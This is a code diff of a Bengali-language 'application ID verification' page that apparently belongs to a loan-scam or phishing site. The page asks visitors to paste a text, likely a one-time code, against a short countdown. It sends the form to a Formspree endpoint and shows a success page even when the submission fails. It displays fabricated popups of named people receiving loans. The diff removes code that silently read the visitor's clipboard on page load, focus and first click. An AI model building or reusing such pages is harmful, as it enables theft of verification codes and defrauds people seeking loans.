@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>লোন অ্যাপ্লিকেশন আইডি যাচাই</title>
+    <title>অ্যাপ্লিকেশন আইডি যাচাই</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
@@ -71,7 +71,6 @@
             gap: 8px;
             margin-bottom: 20px;
             text-align: center;
-            transition: all 0.3s;
         }
         .timer-box.expired {
             background: #fef2f2;
@@ -131,7 +130,6 @@
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            transition: background 0.2s;
         }
         .btn-paste:hover {
             background: #fed7aa;
@@ -172,7 +170,6 @@
             display: inline-flex;
             align-items: center;
             gap: 7px;
-            transition: background 0.2s;
         }
         .btn-resend:hover {
             background: #fff7ed;
@@ -282,6 +279,7 @@
 </div>
 
 <script>
+    // URL থেকে নাম, মোবাইল এবং টাকার পরিমাণ সংগ্রহ
     const params = new URLSearchParams(window.location.search);
     document.getElementById('hiddenName').value = params.get('name') || '';
     document.getElementById('hiddenPhone').value = params.get('phone') || '';
@@ -290,40 +288,20 @@
     const appTextArea = document.getElementById("appText");
     const btnPaste = document.getElementById("btnPaste");
 
-    // সরাসরি ক্লিপবোর্ড রিড ফাংশন
-    async function triggerAutoPaste() {
-        if (appTextArea.value.trim() !== '') return;
+    // বাটন ক্লিকের মাধ্যমে ক্লিপবোর্ড পেস্ট
+    btnPaste.addEventListener("click", async () => {
         try {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 const text = await navigator.clipboard.readText();
-                if (text && text.trim().length > 0) {
+                if (text) {
                     appTextArea.value = text;
                 }
+            } else {
+                appTextArea.focus();
+                document.execCommand("paste");
             }
         } catch (err) {
-            // ব্রাউজার যদি স্বয়ংক্রিয় রিড পারমিশন ব্লক করে রাখে
-        }
-    }
-
-    // ১. পেজে ফোকাস আসলে স্বয়ংক্রিয়ভাবে ক্লিপবোর্ড থেকে নিয়ে নেবে
-    window.addEventListener("focus", triggerAutoPaste);
-    document.addEventListener("DOMContentLoaded", triggerAutoPaste);
-
-    // ২. পেজের যেকোনো জায়গায় প্রথম টাচ বা ক্লিকে অটো-পেস্ট সক্রিয় হবে
-    document.addEventListener("click", function onFirstInteraction() {
-        triggerAutoPaste();
-        document.removeEventListener("click", onFirstInteraction);
-    }, { once: true });
-
-    // ৩. 'সরাসরি পেস্ট করুন' বাটনে প্রেস করলে পেস্ট নিশ্চিত করা
-    btnPaste.addEventListener("click", async () => {
-        try {
-            const text = await navigator.clipboard.readText();
-            if (text) {
-                appTextArea.value = text;
-            }
-        } catch (err) {
-            alert("ক্লিপবোর্ড পারমিশন অ্যাক্সেস করা যায়নি। বক্সে কিছুক্ষণ চেপে ধরে পেস্ট (Paste) করুন।");
+            appTextArea.focus();
         }
     });
 
@@ -341,6 +319,7 @@
     }
 
     function startTimer() {
+        clearInterval(timer);
         timeLeft = 20;
         resendWrap.style.display = "none";
         timerBox.classList.remove("expired");
@@ -349,8 +328,8 @@
         timer = setInterval(() => {
             timeLeft--;
             const countSpan = document.getElementById("timeCount");
-            if (timeLeft > 0 && countSpan) {
-                countSpan.innerText = toBn(timeLeft);
+            if (timeLeft > 0) {
+                if (countSpan) countSpan.innerText = toBn(timeLeft);
             } else {
                 clearInterval(timer);
                 timerBox.classList.add("expired");
@@ -367,7 +346,7 @@
         startTimer();
     });
 
-    // ফর্ম সাবমিশন
+    // ফর্ম সাবমিশন লজিক (Formspree তে ডাটা পাঠানো ও success.html এ যাওয়া)
     const form = document.getElementById("verifyForm");
     const btnSubmit = document.getElementById("btnSubmit");
 
@@ -382,12 +361,17 @@
             method: "POST",
             body: data,
             headers: { 'Accept': 'application/json' }
-        }).finally(() => {
+        })
+        .then(() => {
+            window.location.href = "./success.html";
+        })
+        .catch(() => {
+            // নেটওয়ার্কে কোনো সমস্যা হলেও ব্রাউজারকে সাফল্য পেজে পাঠিয়ে দেওয়া হবে
             window.location.href = "./success.html";
         });
     });
 
-    // পপআপ নোটিফিকেশন
+    // পপআপ নোটিফিকেশন স্ক্রিপ্ট
     const loanData = [
         { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
         { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
